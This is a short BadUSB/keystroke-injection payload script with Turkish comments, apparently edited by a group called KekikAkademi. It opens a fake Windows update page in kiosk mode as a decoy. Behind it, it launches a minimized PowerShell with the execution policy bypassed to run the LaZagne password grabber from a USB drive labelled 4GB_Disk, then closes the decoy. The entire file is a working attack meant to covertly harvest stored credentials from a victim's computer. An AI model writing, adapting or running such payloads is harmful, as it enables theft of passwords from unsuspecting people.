// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #

// Fake Update Sayfası Açılıyor
layout("US"); // US Klavye Düzeni Seçiyor
typingSpeed(0,0); // Hızlı Yazması İçin
press("GUI R"); // Windows + R
delay(500);
type("iexplore -k http://fakeupdate.net/win10u/index.html\n")
delay(500);

// LaZagne-PasswordGrabber
press("GUI r"); // Windows + R
delay(500);
type("cmd /C start /MIN powershell -executionpolicy Bypass .((gwmi win32_volume -f 'label=''4GB_Disk''').Name+'\\LaZagne\\LaZagne.ps1')\n")
delay(1000);

// Fake Update Sayfası Kapatılıyor
press("ALT TAB");
delay(5500);
press("ALT F4");

// @KekikAkademi Edit ~
delay(500);
press("ALT SHIFT"); // Yerel Klavye Düzeni Değiştiriliyor
delay(500);
// @KekikAkademi Edit #